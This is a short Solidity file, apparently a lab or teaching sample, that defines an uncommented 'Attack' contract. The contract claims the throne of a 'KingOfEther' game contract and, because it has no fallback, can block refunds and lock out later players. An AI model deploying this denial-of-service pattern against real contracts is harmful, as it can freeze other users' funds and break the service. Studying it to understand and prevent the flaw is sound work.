//SPDX-License-Identifier:MIT
pragma solidity ^0.8.2;

interface KingOfEther {
    function claimThrone() external payable;
}

contract Attack {
    KingOfEther kingofether;

    constructor(address _KingOfEther) {
        kingofether = KingOfEther(_KingOfEther);
    }

    function attack() public payable {
        require(msg.value > 0, "less than 0");
        kingofether.claimThrone{value: msg.value}();
    }
}
